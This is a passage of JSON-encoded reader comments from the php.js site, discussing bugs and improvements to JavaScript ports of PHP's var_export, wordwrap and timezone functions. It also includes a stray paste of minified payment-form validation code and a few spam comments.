&quot;\\\\$1&quot;).replace('\/\\0\/g', &quot;\\\\0&quot;) + &quot;'&quot;;\r\n      }\r\n      \r\n      return retstr;\r\n  }\r\n}"},{"date":"2009-04-16 16:57:13","author":"Tom","url":"","comment":"The returned representation of provided function is valid PHP code (which is correct). But does anyone have a JS var_export function whose returned representation is valid javascript code? The returned value should be string and it could be passed to eval() function\nExamples:\n[CODE]\nvar a = new Array(12, '13', 'abc', 'line1\\nline2\\nline3');\nvar js_code = var_export(a);\n\/*\nthe returned value should be:\n\"{0:12, 1:'13', 2:'abc', 3:'line1\\nline2\\nline3'}\"\n*\/\n\nvar b = {'key1':4, 'key2':'5', 'key3':'xxx\\n123', 555:'text'};\njs_code = var_export(b);\n\/*\nthe returned value should be:\n\"{'key1':4, 'key2':'5', 'key3':'xxx\\n123', 555:'text'}\"\n*\/\n\nvar c = 123;\njs_code = var_export(c); \/\/ \"123\"\n\nvar d = '321';\njs_code = var_export(d); \/\/ \"'321'\"\n\nvar e = 'multilne\\ntext';\njs_code = var_export(e); \/\/ \"'multiline\\ntext'\"\n\nfunction add(x, y)\n{\n      res = x + y;\n      return res;\n}\nvar js_code = var_export(add);\n\/*\nthe returned value should be:\n\"function add(x, y) { res = x + y; return res; }\"\n*\/\n[\/CODE]\n\nThanks.\n"},{"date":"2009-04-17 02:45:50","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hello Tom, \n\nYou might look at our serialize implementation http:\/\/phpjs.org\/functions\/view\/508 for support for some JS types.\n\nAs you might already be aware, you can also get some of this with JSON. See http:\/\/json.org if you're not familiar with it or are looking for an existing parser\/stringifier (Mozilla provides access to these natively for JSON parsing\/stringifying if you were working with Firefox extensions).  You technically can just use \"eval()\" for parsing, but that is unsafe, especially if user input could creep into the expression, unless you know what you're doing with it.\n\nHowever, it is true that JSON (as with serialize() in some cases) does not allow other JS types, specifically functions (as you list) including as classes, the \"undefined\" type, Date objects, RegExp objects, and the built-in Error types (see https:\/\/developer.mozilla.org\/en\/Core_JavaScript_1.5_Reference\/Global_Objects\/Error ) (unless these are represented in some other way, just as strings or objects), and does not capture the prototype for objects.\n\nThat would be a useful option to have, I think, so if someone can implement it, maybe we can have a switch in the function to determine what kind of output to give. For most types, it shouldn't be too hard to do, as you could usually just rely on \"toString()\" (at least as a base), though you'd have to grab any user-defined prototype object on a function, etc. ... \n\nThis is a good example of the cases where being able to have configuration options is useful. php_check_syntax() has a similar dilemma to yours. \n\nWe've already built in some support for this which can be used now: PHP-style ini options. So, we could define our own \"ini\" for this function, using \"phpjs.\" as the \"extension prefix\" (e.g., \"phpjs.var_export_as_js\"), and then allow users to use an ini file or ini_set() to set a non-default behavior. The function in turn would do a check like:\n\n[CODE]\n\/\/ this.php_js.ini would be set earlier, by ini_set(), an ini file \n\/\/ which directly added to this.php_js.ini (fastest), or by parsing a\n\/\/ PHP-style ini file (no support for the latter yet). \n\/\/\n\nif (this.php_js && this.php_js.ini && this.php_js.ini.local_value['phpjs.var_export_as_js']) { \/\/ each ini should define local_value and global_value, so that it is possible to revert within the script back from ini_set() to the default behavior.\n...\n}\n[\/CODE]\n\nNote that references to 'this' will also work for the non-namespaced version of PHP.JS as it refers to the window object (PHP.JS reserves one global, \"php_js\", in the non-namespaced version).\n\nAt some point in the future, I think Kevin agreed in principle to allowing the namespaced version to accept configuration options in the constructor (e.g., $P = new PHP_JS({phpjs.var_export_as_js:true, ...})), so that, e.g., you could specify that by default you wanted var_export to work with JS."},{"date":"2009-07-13 04:26:01","author":"Brian Tafoya","url":"http:\/\/www.premasolutions.com","comment":"According to IE, there is an error within the regex on line 74...\n\n[CODE]\nfuncParts = mixed_expression.toString().match(\/function .*?\\((.*?)\\) \\{([^]*)\\}\/);\n[\/CODE]\n\nClaims it is expecting an ']' but I was not able to resolve this."},{"date":"2009-07-13 16:40:08","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Fixed in SVN. Thanks for the report! \n\nIn the meantime, convert \"[^]\" to \"[\\s\\S]\" (no quotes). The former works in PHP and Mozilla JavaScript but not IE--also fixed in the remaining functions which had this problem."},{"date":"2009-07-14 12:40:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir & Brian Tafoya: Good job guys!"},{"date":"2011-04-20 03:17:29","author":"ekim","url":"","comment":"[CODE]\nRA=[]; RA[1]=RA;\ncurse={re:RA}; curse.s=curse;\n[\/CODE]\n Can the output strings for RA and curse be posted to see what they look like?"},{"date":"2012-05-31 00:14:42","author":"Hans Henrik","url":"hanshenrik.tk","comment":"here is an alternate, much simpler implementation.. (since the javascript's var_export equalent seems to be JSON.stringify) \n[CODE]\nfunction var_export (mixed_expression, bool_return) {\n    if (bool_return != true) {\n        this.echo(JSON.stringify(mixed_expression));\n        return null;\n    } else {\nreturn JSON.stringify(mixed_expression);\n}\n}\n[\/CODE]\n\nalso, in the current code, bool_return !== true should be bool_return != true\n(php's var_export don't care if you call var_export(blabla,1) or call var_export(blabla,true); )"},{"date":"2012-07-06 03:26:03","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ekim: No, var_export in php.js currently does not support recursive references (or flag them as errors). Feel free to add support!\n@Hans Henrik: We cannot use JSON.stringify for a few reasons: 1) JSON doesn't allow functions; JSON is only a subset of JavaScript intended for safely conveying data across platform. 2) JSON methods are not supported in older browsers. 3) PHP's var_export detects other properties like resources as do we (in our own way, even though JS does not have resource types). As far as your point about the 2nd argument, I have fixed it in Git (along with fixing some JSLint issues). Thanks!"}],"wordwrap":[{"date":"2008-01-07 10:52:48","author":"BlazS","url":"","comment":"Awesome! ;)"},{"date":"2008-01-08 12:36:19","author":"mdsjack","url":"","comment":"Here's some code I had done for my needs:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction include(filename) \/\/ PHP include() emulation\r\n{ \/\/ BY mdsjack (http:\/\/www.mdsjack.bo.it)\r\n\tvar js = document.createElement('script');\r\n\tjs.setAttribute('type', 'text\/javascript');\r\n\tjs.setAttribute('src', filename);\r\n\tjs.setAttribute('defer', 'defer');\r\n\tdocument.getElementsByTagName('HEAD')[0].appendChild(js);\r\n};\r\n\r\nString.prototype.trim = function() \/\/ PHP trim() emulation\r\n{ \/\/ BY mdsjack (http:\/\/www.mdsjack.bo.it)\r\n\treturn this.replace(\/&amp;nbsp;$\/g, ' ').replace(\/^\\s*|\\s*$\/g, '');\r\n};\r\n\r\nString.prototype.strip_tags = function() \/\/ PHP strip_tags() emulation\r\n{ \/\/ BY mdsjack (http:\/\/www.mdsjack.bo.it)\r\n\treturn this.replace(\/(&lt;([^&gt;]+)&gt;)\/ig, ''); \r\n};\r\n\r\n[\/CODE]\r\n\r\ncheers,\r\njack."},{"date":"2008-01-08 13:42:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ mdsjack: Hi Jack, I have added include() and improved trim() to support 'nbsp'. strip_tags() was already here. \r\nThank you very much for contributing! Kevin"},{"date":"2008-01-08 15:48:49","author":"AljazB","url":"","comment":"Awesome, stari!!!"},{"date":"2008-01-10 04:49:45","author":"Jonas Raoni","url":"","comment":"array_diff\r\nhttp:\/\/jsfromhell.com\/array\/diff\r\n\r\ndate\r\nhttp:\/\/jsfromhell.com\/geral\/date-format\r\n\r\nlevenshtein\r\nhttp:\/\/jsfromhell.com\/string\/levenshtein\r\n\r\nbindec\/decbin\/dechex\/etc\r\nhttp:\/\/jsfromhell.com\/number\/base-conversor\r\n\r\nnumber_format\r\nhttp:\/\/jsfromhell.com\/number\/fmt-money\r\n\r\nsetcookie\r\nhttp:\/\/jsfromhell.com\/geral\/cookie\r\n\r\nutf8\r\nhttp:\/\/jsfromhell.com\/geral\/utf-8\r\n\r\ncheckdate:\r\nhttp:\/\/jsfromhell.com\/geral\/is-date\r\n\r\nshuffle\r\nhttp:\/\/jsfromhell.com\/array\/shuffle\r\n\r\npack\/unpack\r\nhttp:\/\/jsfromhell.com\/classes\/binary-parser\r\n\r\narray_chunk\r\nhttp:\/\/jsfromhell.com\/array\/chunk\r\n\r\narray_unique \r\nhttp:\/\/jsfromhell.com\/array\/remove-duplicated"},{"date":"2008-01-10 09:10:11","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: I'm going to process all of your links (utf8 is already present though). And judging by the quality of previous functions from your hand, I think it's safe to say they'll all end up here. Thanks a bunch :)"},{"date":"2008-01-20 15:50:53","author":"Andrea Giammarchi","url":"","comment":"I wonder why you didn't post my comment but you added &quot;define&quot; under construction. Come on guys, define exists and it's perfectly compatible with php one since 3 or more months ago.\r\n\r\nPlease add my name in contributes and good luck with this project.\r\n\r\nCheers"},{"date":"2008-01-20 20:37:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andrea Giammarchi: Don't worry I think it's cool and I really want to add it. And by the way, once it's added, credits are updated automatically.\r\n\r\nBut my problem now is that I couldn't get define() compatible with my automatic tester:\r\nhttp:\/\/kevin.vanzonneveld.net\/pj_tester.php?unstable=true&amp;jsfile=_define.js\r\n\r\nSo that's the reason that I had to put it 'under construction'. I have to figure out how to solve this."},{"date":"2008-01-21 20:56:20","author":"Andrea Giammarchi","url":"","comment":"Kevin you could know PHP perfectly but you should study a bit more JavaScript :D\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif(!function_exists2('define')){\r\n\tdocument.write('&lt;div class=&quot;bad&quot;&gt;&lt;xmp&gt;n\/a&lt;\/xmp&gt;&lt;\/div&gt;');\r\n\toutcom = ['0', 'function does not exist'];\r\n} else {\r\n\tresult = (function(){\r\n\t\tvar\tresult = false;\r\n\t\tdefine('AUTHOR_NAME', 'Andrea Giammarchi');\r\n\t\ttry{result = !!AUTHOR_NAME}catch(e){};\r\n\t\treturn\tresult;\r\n\t})();\r\n\tshould = true;\r\n\toutcom = comparer(result, should);\r\n\tclass = ( outcom[0] &gt; 0 ? 'good' : 'bad' );\r\n\tdocument.write('&lt;div class=&quot;'+class+'&quot;&gt;&lt;xmp&gt;'+print_r2(result)+'&lt;\/xmp&gt;&lt;\/div&gt;');\r\n}\r\n[\/CODE]\r\n\r\ncya ;)"},{"date":"2008-01-22 08:36:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andrea Giammarchi: Thanks for helping out. I wasn't mentally ready to make exceptions in my generic tester, but hey, sometimes you gotta be flexible.\r\n\r\nI also had to change the system to accept:\r\n[CODE=&quot;Javascript&quot;]\r\ndefine = (function(){\r\n[\/CODE]\r\n\r\ninstead of\r\n[CODE=&quot;Javascript&quot;]\r\nfunction define(){\r\n[\/CODE]\r\n\r\nBut you'll be happy to know that it works now:\r\nhttp:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_define\/\r\n\r\nSo thanks!"},{"date":"2008-04-12 17:30:16","author":"Jonas Raoni","url":"","comment":"Be aware that the modification by Nick Callen over my original wordwrap code breaks this snippet:\r\n\r\nalert(wordwrap(&quot;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&quot;, 10, &quot;\\n&quot;));\r\n\r\nThe last version is sitted here: http:\/\/jsfromhell.com\/string\/wordwrap"},{"date":"2008-04-13 12:24:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Your link gives an error in FF3 on Ubuntu: \r\n\r\n[CODE=&quot;text&quot;]\r\nXML Parsing Error: mismatched tag. Expected: &lt;\/dd&gt;.\r\nLocation: http:\/\/jsfromhell.com\/string\/wordwrap\r\nLine Number 135, Column 4:\t&lt;\/dl&gt;\r\n----------^\r\n[\/CODE]"},{"date":"2008-04-15 06:38:15","author":"Jonas Raoni","url":"","comment":"Awful haha, it was a mistake in the help code, I don't check the English version of the site since I'm brazilian, I've added the missing &lt;\/dd&gt; ^^"},{"date":"2008-04-15 08:22:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Working now, thank you!"},{"date":"2008-05-16 04:51:54","author":"Homer Villanueva - pinoy programmer","url":"","comment":"It is a great help for us familiar with php but with only little  knowledge in javascript. Thank you and more power! \r\n\r\nKeep up the work and continue creating good things like this..\r\n\r\n\r\nI really appreciate using the wordwrap function.."},{"date":"2008-09-30 21:27:59","author":"Sakimori","url":"","comment":"Note that in PHP only the string parameter is required. The rest are optional.\r\n \r\nThe JS function header should just be:\r\n[CODE=&quot;Javascript&quot;]function wordwrap(str)[\/CODE]\r\n... and the function body should begin with:\r\n[CODE=&quot;Javascript&quot;]\tvar int_width = ((arguments.length &gt;= 2) ? arguments[1] : 75   );\r\n\tvar str_break = ((arguments.length &gt;= 3) ? arguments[2] : &quot;\\n&quot; );\r\n\tvar cut       = ((arguments.length &gt;= 4) ? arguments[3] : false);[\/CODE]\r\nNote that 75, new-line, and false are PHP's default values for the width, break-string, and cut flag parameters. Feel free to rewrite my code; I write for legibility, not speed.\r\n \r\nAlso of note is that the comment submission form didn't want to take my preferred email address. Looks like it doesn't like dashes in the domain name. Might want to look over your email validation regexp."},{"date":"2008-10-01 12:24:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Sakimori: Excellent points Sakimori! I've fixed all of your suggestions (even blog regex ;) Thank you!"},{"date":"2009-04-09 12:53:35","author":"Dave","url":"","comment":"Slight problems using with a Textarea in IE6,7,8 \n\nIn firefox the script works perfectly, just what I need. However in IE7 and IE8 if you happen to have a space at the end of the line, you get some very strange results (inserts and extra line, every character).  Are you able to update your script so that if a space is at the end of the line, it deletes it(replaces with the \\n). I expect it is easy to do, but I\u2019m not a javascript expert (could do it in VBScript\/ASP).\n\nGreat script though, works fine in all \"proper\" browsers, but unfortunately need it to work in IE as well.  Thanks in advance,\n\nDave\n"},{"date":"2009-04-14 12:57:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Dave + Everyone: Is there anybody out there who has IE & can confirm \/ debug this? Otherwise I will have to see if I can run a virtualized machine or something but that seems like a lot of trouble for one buggy function."},{"date":"2009-04-14 17:12:46","author":"Michael Grier","url":"","comment":"Without even testing in IE, I can say it should be using a regex in the split, especially when _reading_ from a textarea, because different OSes are going to be using different line break characters, and those characters are _read_ from a textarea. When you put text _into_ a textarea, the browser will insert the correct line break characters, but coming out of a textarea, the code has to deal with it.\n\nSo you should do this (windows|*nix|mac):\n\n[CODE]\nr = str.split(\/\\r\\n|\\n|\\r\/)\n[\/CODE]"},{"date":"2009-04-19 23:09:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael Grier: Great! That should obviously fix some windows issues. \n\n@ Dave: Can you confirm that this solves your problem as well?"},{"date":"2010-02-22 07:22:00","author":"altaf","url":"","comment":"$(document).ready(function(){if($(\"input[name=modeofpayment]:radio\")){$(\"input[name=modeofpayment]:radio\").attr(\"checked\",\"\");}$(\"form\").each(function(){var a=$(this);a.submit(function(){a.find(\"input[type='image'],input[type='submit']\").attr(\"disabled\",\"true\");});});});function showHide(b,a){if(b!=\"MasterCardVisa\"){$(\".redborder\").removeClass(\"redborder\");}$(\"#cluetip\").css(\"display\",\"none\");$(\"#mainerror\").hide(\"fast\");$(\".displaydiv\").not(\"#\"+b).hide(\"fast\");$(\"#\"+b).show(\"slow\");$(\".greenshade\").not(\"#\"+a).removeClass(\"left big greenshade\").addClass(\"left big yellowshade\");$(\"#\"+a).addClass(\"left big greenshade\");}function print_page(a){win=window.open(a);}function populatecity(){var a=$(\"#citydis\").val();if(a==\"\"){alert(\"Please select your city\");return false;}else{document.getElementById(\"city\").value=a;document.getElementById(\"addresstable\").style.display=\"block\";document.getElementById(\"citydiv\").style.display=\"none\";}}$(document).ready(function(){$(\".bluelink\").cluetip({activation:\"click\",sticky:true,arrows:true,cluetipClass:\"rounded\",dropShadow:false,ajaxCache:true,closeText:\"Close X\",onShow:function(){var a=$(\"#cluetip\").height();var b=$(\"#cluetip-arrows\").position();if(b.top<20){$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows-white\");}else{if(a>500&&b.top<400){$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows-white\");}else{$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows\");}}}});$(\".bluelinkfront\").cluetip({activation:\"click\",sticky:true,arrows:true,cluetipClass:\"rounded\",dropShadow:false,ajaxCache:true,width:316,positionBy:\"bottomTop\",closeText:\"Close X\",onShow:function(){$(\"#hint2\").hide();$(\"#tooltip\").hide();}});$(\".bluelinklpop\").cluetip({activation:\"click\",sticky:true,arrows:true,cluetipClass:\"rounded\",dropShadow:false,ajaxCache:true,width:387,closeText:\"Close X\",onShow:function(){$(\"#hint2\").hide();$(\"#tooltip\").hide();var a=$(\"#cluetip\").height();var b=$(\"#cluetip-arrows\").position();if(b.top<20){$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows-white\");}else{if(a>400&&b.top<420){$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows-white\");}else{if(a>200&&b.top<150){$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows-white\");}else{$(\"#cluetip-arrows\").removeClass();$(\"#cluetip-arrows\").addClass(\"cluetip-arrows\");}}}}});});function submitForm(b){var a=\"\/payment\/validate\";$(\"#processing\").empty().html('<img src=\"\/images\/wait.gif\" \/> &nbsp;&nbsp; Processing Request ....');$.getJSON(a,{cardhname:$(\"#cardhname\").val(),ccno1:$(\"#ccno1\").val(),ccno2:$(\"#ccno2\").val(),ccno3:$(\"#ccno3\").val(),ccno4:$(\"#ccno4\").val(),month:$(\"#month\").val(),year:$(\"#year\").val(),cvv:$(\"#cvv\").val(),ctype:$(\"input[name=cardtype]:checked\").val()},function(d){$(\"#processing\").hide();if(!d){b.submit();document.MasterCardVisa.reset();$(\"#cardhname\").removeClass(\"redborder\");$(\"#ccno1\").removeClass(\"redborder\");$(\"#ccno2\").removeClass(\"redborder\");$(\"#ccno3\").removeClass(\"redborder\");$(\"#ccno4\").removeClass(\"redborder\");$(\"#cvv\").removeClass(\"redborder\");$(\"label[for='cardtype-visa']\").removeClass(\"redborder\");$(\"label[for='cardtype-mastercard']\").removeClass(\"redborder\");$(\"#monthid\").removeClass(\"redborder\");$(\"#yearid\").removeClass(\"redborder\");}else{$(\"input[type='image']\").removeAttr(\"disabled\");var c=\"Please check the field marked in Red<br>\";if(typeof(d.nameerror)!=\"undefined\"){$(\"#cardhname\").addClass(\"redborder\");c+=d.nameerror+\"<br>\";}else{$(\"#cardhname\").removeClass(\"redborder\");}if(typeof(d.ccerror)!=\"undefined\"){$(\"#ccno1\").addClass(\"redborder\");$(\"#ccno2\").addClass(\"redborder\");$(\"#ccno3\").addClass(\"redborder\");$(\"#ccno4\").addClass(\"redborder\");c+=d.ccerror+\"<br>\";}else{$(\"#ccno1\").removeClass(\"redborder\");$(\"#ccno2\").removeClass(\"redborder\");$(\"#ccno3\").removeClass(\"redborder\");$(\"#ccno4\").removeClass(\"redborder\");}if(typeof(d.cvverror)!=\"undefined\"){$(\"#cvv\").addClass(\"redborder\");c+=d.cvverror+\"<br>\";}else{$(\"#cvv\").removeClass(\"redborder\");}if(typeof(d.ctypeerror)!=\"undefined\"){$(\"label[for='cardtype-visa']\").addClass(\"redborder\");$(\"label[for='cardtype-mastercard']\").addClass(\"redborder\");c+=d.ctypeerror+\"<br>\";}else{$(\"label[for='cardtype-visa']\").removeClass(\"redborder\");$(\"label[for='cardtype-mastercard']\").removeClass(\"redborder\");}if(typeof(d.montherror)!=\"undefined\"){$(\"#monthid\").addClass(\"redborder\");c+=d.montherror+\"<br>\";}else{$(\"#monthid\").removeClass(\"redborder\");}if(typeof(d.yearerror)!=\"undefined\"){$(\"#yearid\").addClass(\"redborder\");c+=d.yearerror+\"<br>\";}else{$(\"#yearid\").removeClass(\"redborder\");}if(typeof(d.expiry)!=\"undefined\"){$(\"#monthid\").addClass(\"redborder\");$(\"#yearid\").addClass(\"redborder\");c+=d.expiry+\"<br>\";}else{if(typeof(d.montherror)==\"undefined\"&&typeof(d.yearerror)==\"undefined\"){$(\"#monthid\").removeClass(\"redborder\");$(\"#yearid\").removeClass(\"redborder\");}}$(\"#mainerror\").show();$(\"#error_div\").html(c);self.location=\"#mainerror\";}});return false;}function submitdebitForm(b){var a=\"\/payment\/validatedebitcard\";$(\"#processing\").empty().html('<img src=\"\/images\/wait.gif\" \/> &nbsp;&nbsp; Processing Request ....');$.getJSON(a,{debitcardhname:$(\"#debitcardhname\").val(),dccno1:$(\"#dccno1\").val(),dccno2:$(\"#dccno2\").val(),dccno3:$(\"#dccno3\").val(),dccno4:$(\"#dccno4\").val(),dmonth:$(\"#dmonth\").val(),dyear:$(\"#dyear\").val(),dcvv:$(\"#dcvv\").val(),dctype:$(\"input[name=dcardtype]:checked\").val(),bankname:$(\"#bank_name\").val()},function(d){$(\"#processing\").hide();if(!d){b.submit();document.DebitCard.reset();$(\"#debitcardhname\").removeClass(\"redborder\");$(\"#dccno1\").removeClass(\"redborder\");$(\"#dccno2\").removeClass(\"redborder\");$(\"#dccno3\").removeClass(\"redborder\");$(\"#dccno4\").removeClass(\"redborder\");$(\"#dcvv\").removeClass(\"redborder\");$(\"label[for='dcardtype-visa']\").removeClass(\"redborder\");$(\"label[for='dcardtype-mastercard']\").removeClass(\"redborder\");$(\"#dmonthid\").removeClass(\"redborder\");$(\"#dyearid\").removeClass(\"redborder\");$(\"#bank_name\").removeClass(\"redborder\");}else{$(\"input[type='image']\").removeAttr(\"disabled\");var c=\"Please check the field marked in Red<br>\";if(typeof(d.nameerror)!=\"undefined\"){$(\"#debitcardhname\").addClass(\"redborder\");c+=d.nameerror+\"<br>\";}else{$(\"#debitcardhname\").removeClass(\"redborder\");}if(typeof(d.ccerror)!=\"undefined\"){$(\"#dccno1\").addClass(\"redborder\");$(\"#dccno2\").addClass(\"redborder\");$(\"#dccno3\").addClass(\"redborder\");$(\"#dccno4\").addClass(\"redborder\");c+=d.ccerror+\"<br>\";}else{$(\"#dccno1\").removeClass(\"redborder\");$(\"#dccno2\").removeClass(\"redborder\");$(\"#dccno3\").removeClass(\"redborder\");$(\"#dccno4\").removeClass(\"redborder\");}if(typeof(d.cvverror)!=\"undefined\"){$(\"#dcvv\").addClass(\"redborder\");c+=d.cvverror+\"<br>\";}else{$(\"#dcvv\").removeClass(\"redborder\");}if(typeof(d.ctypeerror)!=\"undefined\"){$(\"label[for='dcardtype-visa']\").addClass(\"redborder\");$(\"label[for='dcardtype-mastercard']\").addClass(\"redborder\");c+=d.ctypeerror+\"<br>\";}else{$(\"label[for='dcardtype-visa']\").removeClass(\"redborder\");$(\"label[for='dcardtype-mastercard']\").removeClass(\"redborder\");}if(typeof(d.montherror)!=\"undefined\"){$(\"#monthid\").addClass(\"redborder\");c+=d.montherror+\"<br>\";}else{$(\"#monthid\").removeClass(\"redborder\");}if(typeof(d.yearerror)!=\"undefined\"){$(\"#yearid\").addClass(\"redborder\");c+=d.yearerror+\"<br>\";}else{$(\"#yearid\").removeClass(\"redborder\");}if(typeof(d.expiry)!=\"undefined\"){$(\"#monthid\").addClass(\"redborder\");$(\"#yearid\").addClass(\"redborder\");c+=d.expiry+\"<br>\";}else{if(typeof(d.montherror)==\"undefined\"&&typeof(d.yearerror)==\"undefined\"){$(\"#monthid\").removeClass(\"redborder\");$(\"#yearid\").removeClass(\"redborder\");}}if(typeof(d.banknameerror)!=\"undefined\"){$(\"#bankname\").addClass(\"redborder\");c+=d.banknameerror+\"<br>\";}else{$(\"#bankname\").removeClass(\"redborder\");}$(\"#mainerror\").show();$(\"#error_div\").html(c);self.location=\"#mainerror\";}});return false;}function submitPickupform(b){var a=\"\/payment\/validatepickup\";$(\"#processing\").empty().html('<img src=\"\/images\/wait.gif\" \/> &nbsp;&nbsp; Processing Request ....');$.getJSON(a,{name:$(\"#name\").val(),address1:$(\"#address1\").val(),email:$(\"#email\").val(),telephoneoffice:$(\"#telephoneoffice\").val(),telephoneres:$(\"#telephoneres\").val(),mobile:$(\"#mobile\").val(),city:$(\"#city\").val()},function(d){$(\"#processing\").hide();if(!d){b.action=\"\/payment\/payment\";b.submit();}else{$(\"input[type='image']\").removeAttr(\"disabled\");var c=\"<br>Please check the field marked in Red<br>\";if(typeof(d.nameerror)!=\"undefined\"){$(\"#name\").addClass(\"redborder\");c+=d.nameerror+\"<br>\";}else{$(\"#name\").removeClass(\"redborder\");}if(typeof(d.emailerror)!=\"undefined\"){$(\"#email\").addClass(\"redborder\");c+=d.emailerror+\"<br>\";}else{$(\"#email\").removeClass(\"redborder2\");}if(typeof(d.address1error)!=\"undefined\"){$(\"#address1\").addClass(\"redborder\");c+=d.address1error+\"<br>\";}else{$(\"#address1\").removeClass(\"redborder\");}if(typeof(d.cityerror)!=\"undefined\"){$(\"#cityerr\").addClass(\"redborder\");c+=d.cityerror+\"<br>\";}else{$(\"#cityerr\").removeClass(\"redborder\");}if(typeof(d.phoneerror)!=\"undefined\"){$(\"#telephoneoffice\").addClass(\"redborder\");c+=d.phoneerror+\"<br>\";}else{$(\"#telephoneoffice\").removeClass(\"redborder\");}$(\"#mainerror\").show();$(\"#error_div\").html(c);}});return false;}function submitPromocodeform(b){var a=\"\/payment\/validatepromocode\";$(\"#processing\").empty().html('<img src=\"\/images\/wait.gif\" \/> &nbsp;&nbsp; Processing Request ....');$.getJSON(a,{promocode:$(\"#promocode\").val()},function(d){if(!d){b.action=\"\/payment\/activateprepaid\";b.submit();}else{$(\"input[type='image']\").removeAttr(\"disabled\");var c=\"\";if(typeof(d.promoemptyErr)!=\"undefined\"){$(\"#promocode\").addClass(\"redborder\");c+=d.promoemptyErr+\"<br>\";}else{$(\"#promocode\").removeClass(\"redborder\");}$(\"#mainerror\").show();$(\"#error_div\").html(c);}});return false;}function submitajax(){var d=$(\"#popupcountry\").val();if(typeof(d)!=\"undefined\"){d=urlencode(d);}else{d=\"\";}var c=$(\"#popcity\").val();var b=$(\"#type\").val();if(d!=\"\"){var a=\"\/payment\/paymentoption\/popup\/\"+b+\"\/ajax\/true\/popcity\/\"+c+\"\/popcountry\/\"+d;}else{var a=\"\/payment\/paymentoption\/popup\/\"+b+\"\/ajax\/true\/popcity\/\"+c;}$(\".addressoverflow\").empty().html('<img src=\"\/images\/wait.gif\" \/>');$(\".addressoverflow\").load(a);return false;}function urlencode(b){var a=\"\";for(i=0;i<b.length;i++){if(b[i]==\" \"){a+=\"+\";}else{a+=escape(b[i]);}}return a;}function fillCities(){var c=$(\"#popupcountry\").val();c=urlencode(c);var b=$(\"#type\").val();var a=\"\/payment\/paymentoption\/popup\/\"+b+\"\/fillcity\/true\/popcountry\/\"+c;$(\"#citydiv\").load(a);return false;}function setstylesheet(c,a){if(c==\"styleblue\"){var d=a+\"css\/stylesmall.css\";var b=a+\"css\/stylebig.css\";}else{if(c==\"stylesmall\"){var d=a+\"css\/stylesmall.css\";var b=a+\"css\/styleblue.css\";}else{var d=a+\"css\/stylebig.css\";var b=a+\"css\/styleblue.css\";}}$(\"link[@rel*=style][href]\").each(function(){this.disabled=false;if(this.getAttribute(\"href\")==d||this.getAttribute(\"href\")==b){this.disabled=true;}});}"},{"date":"2012-04-10 09:51:06","author":"????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before "},{"date":"2012-04-19 17:23:55","author":"Cristiano Santos","url":"","comment":"There's a problem with the \"wordwrap\" function... Some string's don't break well.\n\nExample:\n\n[CODE]wordwrap(\"Uma nova password foi enviada por E-mail.\", 28, '|', true);[\/CODE]\n\nExpected:\n\"Uma nova password foi |enviada por E-mail.\"\n\nResult: \n\"Uma nova password foi |enviada por |E-mail.\"\n"},{"date":"2012-04-19 17:32:49","author":"Cristiano Santos","url":"","comment":"Just forget my last comment.\n\nThe error was mine and not from the function... Sorry..."},{"date":"2012-07-14 13:37:06","author":"Alex","url":"","comment":"Nice work so far; I have found just a little bug: If a line is exactly as long as str_length, the space will be carried to the next line and will cause an indentation of the following line."}],"timezone_identifiers_list":[{"date":"2012-04-11 15:46:40","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas "}],"date_default_timezone_get":[{"date":"2009-07-14 18:59:40","author":"Stepahen","url":"no website","comment":"thanks for this script"}],"date_default_timezone_set":[{"date":"2011-07-13 05:53:54","author":"Alberto Ruiz","url":"","comment":"Can you pass a variable into date_default_timezone_set()?\r\n\r\n[CODE]\r\n$myTimeZONEvar=$_SESSION['setting_timezone_session']; \/\/ I saved 'America\/New_York' into a session\r\necho $myTimeZONEvar; \/\/ This shows that the variable is exactly 'America\/New_York'\r\ndate_default_timezone_set($myTimeZONEvar); \/\/ I get an error everytime I try to run this...but if I remove the variable and put in the string 'America\/New_York'\r\n....then it works.\r\n[\/CODE]\r\n"},{"date":"2011-07-20 05:17:25","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Alberto Ruiz: You really should try posting in a help forum like StackOverflow (tagged with \"PHP\"), as this page is just about our JavaScript implementation. Try using \"var_dump\" instead of \"echo\" to ensure that the string is of the right length and not containing extra characters or something."},{"date":"2011-12-07 15:05:26","author":"Alberto Basso","url":"","comment":"The function 